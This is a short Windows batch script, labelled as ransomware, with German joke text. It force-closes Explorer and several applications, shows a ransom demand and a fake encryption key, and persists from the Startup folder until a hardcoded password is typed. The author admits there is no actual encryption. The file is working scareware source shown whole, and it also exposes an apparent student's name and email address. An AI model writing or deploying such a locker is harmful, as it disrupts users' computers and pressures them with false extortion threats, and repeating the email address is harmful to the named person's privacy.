@echo off
taskkill /f /im explorer.exe
echo explorer killed.
taskkill /f /im chrome.exe
echo chrome killed.
taskkill /f /im notepad.exe
echo notepad killed.
taskkill /f /im firefox.exe
echo firefox killed
title S#itty Ransomware V0.1
color 2
cls
goto :text2

:text
cls
echo Falscher Code!

:text2
echo.
echo lol gibe me geld sonst bleibt dein pc gesperrt.
echo gecoded von alex, alles alex's schuld.
echo (AlBachmann@schueler.berufskolleg.de)
echo btw der PC ist net encrypted, zu viel Arbeit xD
echo gesperrt ist er btw auch net lol
echo aber die Datei ist im startup :D
echo blablabla mucho texto
echo.
echo dein Encryption-Key oder sowas:
echo EFBGC3DMOM2DEMA=
echo.
echo.
echo Decryption-Code Eingabe:
set /p input=">>>":
if "%input%" == "!Balls420" goto :end
echo falsches passwort!
goto :text

:end
echo restarting desktop environment...
start C:\Windows\explorer.exe
del C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\payload.bat
exit
